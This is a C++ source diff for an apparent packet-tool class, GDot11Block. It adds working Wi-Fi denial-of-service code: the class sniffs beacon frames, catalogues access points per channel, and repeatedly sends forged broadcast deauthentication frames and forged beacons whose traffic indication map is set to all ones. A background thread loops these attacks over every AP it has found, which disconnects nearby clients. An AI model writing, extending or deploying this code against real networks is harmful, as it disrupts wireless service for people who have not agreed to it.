@@ -1,6 +1,4 @@
 #include "gdot11block.h"
-#include "net/pdu/gdeauthhdr.h"
-#include "net/pdu/gbeaconhdr.h"
 
 // ----------------------------------------------------------------------------
 // GDot11Block
@@ -18,36 +16,56 @@ bool GDot11Block::doOpen() {
 		return false;
 	}
 
+	apMap_.clear();
+	attackThread_.start();
+	deleteThread_.start();
 	return true;
 }
 
 bool GDot11Block::doClose() {
+	attackThread_.we_.wakeAll();
+	attackThread_.quit();
+	attackThread_.wait();
+
+	deleteThread_.we_.wakeAll();
+	deleteThread_.quit();
+	deleteThread_.wait();
+
 	return true;
 }
 
-void GDot11Block::block(GPacket* packet) {
-	if (!enabled_) return;
+void GDot11Block::processBeacon(GPacket* packet) {
+	GBeaconHdr* beaconHdr = packet->beaconHdr_;
+	Q_ASSERT(beaconHdr != nullptr);
 
-	GDot11ExtHdr* dot11ExtHdr = packet->dot11ExtHdr_;
-	if (dot11ExtHdr == nullptr) return;
+	QMutexLocker ml(&apMap_.m_);
+	ApMap::iterator it = apMap_.find(currentChannel_);
+	if (it == apMap_.end()) {
+		Aps aps;
+		it = apMap_.insert(currentChannel_, aps);
+	}
+	Q_ASSERT(it != apMap_.end());
+	Aps& aps = it.value();
 
-	le8_t typeSubtype = dot11ExtHdr->typeSubtype();
-	if (typeSubtype != GDot11Hdr::Beacon) return;
+	GMac mac = beaconHdr->bssid();
+	Aps::iterator apsIt = aps.find(mac);
+	if (apsIt == aps.end()) {
+		Ap ap;
+		ap.channel_ = currentChannel_;
+		ap.mac_ = mac;
+		ap.deauthFrame_.radioHdr_.init();
+		ap.deauthFrame_.deauthHdr_.init(beaconHdr->ta());
 
-	struct DeauthFrame {
-		GRadioHdr radioHdr_;
-		GDeauthHdr deauthHdr_;
-	} deauthFrame;
+		QByteArray timFrame = extractBeaconTimFrame(packet);
+		if (!timFrame.isEmpty()) {
+			ap.timFrame_ = timFrame;
+		}
+		apsIt = aps.insert(mac, ap);
 
-	deauthFrame.radioHdr_.init();
-	deauthFrame.deauthHdr_.init(dot11ExtHdr->ta());
-	writer_->write(GBuf(pbyte(&deauthFrame), sizeof(deauthFrame)));
+		if (debugLog_) {
+			QString ssid;
+			int channel = 0;
 
-	if (debugLog_) {
-		GBeaconHdr* beaconHdr = GBeaconHdr::check(dot11ExtHdr, packet->buf_.size_);
-		QString ssid;
-		int channel = 0;
-		if (beaconHdr != nullptr) {
 			GBeaconHdr::Tag* tag = beaconHdr->firstTag();
 			void* end = packet->buf_.data_ + packet->buf_.size_;
 			while(tag < end) {
@@ -69,13 +87,96 @@ void GDot11Block::block(GPacket* packet) {
 			}
 			if (ssid != "")
 				qDebug() << ssid << channel;
+			emit blocked(packet);
+		}
+	}
+	if (attackOnPacket_) {
+		Ap& ap = apsIt.value();
+		attack(ap);
+	}
+}
+
+void GDot11Block::attack(Ap& ap) {
+	if (deauthApBroadcast_) {
+		GBuf buf(pbyte(&ap.deauthFrame_), sizeof(ap.deauthFrame_));
+		writer_->write(buf);
+	}
+	if (timAttack_) {
+		GBuf buf(pbyte(ap.timFrame_.data()), ap.timFrame_.size());
+		writer_->write(buf);
+	}
+}
+
+QByteArray GDot11Block::extractBeaconTimFrame(GPacket *packet) {
+	GRadioHdr* radioHdr = packet->radioHdr_;
+	Q_ASSERT(radioHdr != nullptr);
+
+	GBeaconHdr* beaconHdr = packet->beaconHdr_;
+	Q_ASSERT(beaconHdr != nullptr);
+
+	size_t beaconSize = packet->buf_.size_ - radioHdr->len_;
+	qDebug() << "beaconSize=" << beaconSize;
+	if (beaconSize > BUFSIZ - sizeof(GRadioHdr)) {
+		qWarning() << QString("too big packet size(%1)").arg(packet->buf_.size_);
+		return QByteArray();
+	} else {
+		char buffer[BUFSIZ];
+		GRadioHdr* timRadioHdr = PRadioHdr(buffer);
+		timRadioHdr->init();
+		GBeaconHdr* timBeaconHdr = PBeaconHdr(buffer + sizeof(GRadioHdr));
+		memcpy(pvoid(timBeaconHdr), pvoid(beaconHdr), beaconSize);
+
+		GBeaconHdr::TrafficIndicationMap* tim = GBeaconHdr::PTrafficIndicationMap(timBeaconHdr->findFirstTag(GBeaconHdr::TagTrafficIndicationMap, packet->buf_.size_));
+		if (tim == nullptr) {
+			qWarning() << "can not find TrafficIndicationMap";
+			return QByteArray();
+		}
+		tim->control_ = 1;
+		tim->bitmap_ = 0xFF;
+		return QByteArray(buffer, sizeof(GRadioHdr) + beaconSize);
+	}
+}
+void GDot11Block::attackRun() {
+	qDebug() << "beg"; // gilgil temp 2022.02.01
+
+	while (active()) {
+		if (attackThread_.we_.wait(attackInterval_)) break;
+		{
+			// QMutexLocker ml(&apMap_.m_); // gilgil temp
+			ApMap::iterator it = apMap_.find(currentChannel_);
+			if (it == apMap_.end()) continue;
+			Aps& aps = it.value();
+
+			for (Ap& ap: aps) {
+				qDebug() << ap.channel_ << QString(ap.mac_);
+				attack(ap);
+				if (attackThread_.we_.wait(sendInterval_)) break;
+			}
 		}
 	}
 
-	emit blocked(packet);
+	qDebug() << "end"; // gilgil temp 2022.02.01
+}
+
+void GDot11Block::deleteRun() {
+	qDebug() << "beg"; // gilgil temp 2022.02.01
+
+	while (active()) {
+		deleteThread_.we_.wait(attackInterval_);
+	}
+
+	qDebug() << "end"; // gilgil temp 2022.02.01
+}
+
+void GDot11Block::block(GPacket* packet) {
+	if (!enabled_) return;
+
+	GBeaconHdr* beaconHdr = packet->beaconHdr_;
+	if (beaconHdr != nullptr)
+		processBeacon(packet);
 }
 
 void GDot11Block::processChannelChanged(int channel) {
-	qDebug() << ""; // gilgil temp 2022.01.29
+	qDebug() << channel;
 	currentChannel_ = channel;
 }
